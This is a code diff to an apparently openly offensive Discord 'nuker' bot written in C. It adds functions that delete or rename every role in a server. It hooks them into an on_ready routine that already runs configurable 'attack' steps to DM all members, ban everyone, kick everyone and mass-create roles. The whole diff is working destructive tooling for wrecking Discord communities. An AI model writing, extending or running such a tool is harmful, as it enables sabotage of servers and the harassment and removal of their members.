@@ -252,7 +252,7 @@ void change_icon(struct discord *client, u64_snowflake_t guild_id,
 }
 
 void mass_roles(struct discord *client, u64_snowflake_t guild_id,
-                  char role_name[15], int count)
+                char role_name[15], int count)
 {
     char *r_name = strtok(role_name, "");
 
@@ -263,14 +263,52 @@ void mass_roles(struct discord *client, u64_snowflake_t guild_id,
         discord_create_guild_role(
             client,
             guild_id,
-            &(struct discord_create_guild_role_params) {
-                .name = r_name
-            },
-            NULL
-        );
+            &(struct discord_create_guild_role_params){
+                .name = r_name},
+            NULL);
     }
 
     log_info("Created %d roles in %" PRIu64, i, guild_id);
+}
+
+void delete_all_roles(struct discord *client, u64_snowflake_t guild_id)
+{
+    struct discord_role **roles = NULL;
+
+    discord_get_guild_roles(client, guild_id, &roles);
+
+    int i = 0;
+    while (roles[i])
+    {
+        discord_delete_guild_role(client, guild_id, roles[i]->id);
+        i++;
+    }
+
+    log_info("Deleted %d roles in %" PRIu64, i, guild_id);
+}
+
+void rename_all_roles(struct discord *client, u64_snowflake_t guild_id,
+                      char role_name_new[15])
+{
+    char *r_name = strtok(role_name_new, "");
+    struct discord_role **roles = NULL;
+
+    discord_get_guild_roles(client, guild_id, &roles);
+
+    int i = 0;
+    while (roles[i])
+    {
+        discord_modify_guild_role(
+            client,
+            guild_id,
+            roles[i]->id,
+            &(struct discord_modify_guild_role_params){
+                .name = r_name},
+            NULL);
+        i++;
+    }
+
+    log_info("Renamed %d roles in %" PRIu64 " --> \"%s\"", i, guild_id, r_name);
 }
 
 void on_ready(struct discord *client)
@@ -339,20 +377,30 @@ void on_ready(struct discord *client)
     {
         dm_all(client, guild_id, s_attack.dm_message);
     }
-    
+
     if (s_attack.ban_all_enabled == true)
     {
         ban_all(client, guild_id);
     }
 
-    if(s_attack.kick_all_enabled == true)
+    if (s_attack.kick_all_enabled == true)
     {
         kick_all(client, guild_id);
     }
 
-    if(s_attack.roles_mass_enabled == true) 
+    if (s_attack.roles_delete_enabled == true)
+    {
+        delete_all_roles(client, guild_id);
+    }
+
+    if (s_attack.roles_mass_enabled == true)
     {
         mass_roles(client, guild_id, s_attack.roles_mass_name, s_attack.roles_mass_count);
+    }
+
+    if(s_attack.roles_rename_enabled == true) 
+    {
+        rename_all_roles(client, guild_id, s_attack.roles_rename_name);
     }
 }
 
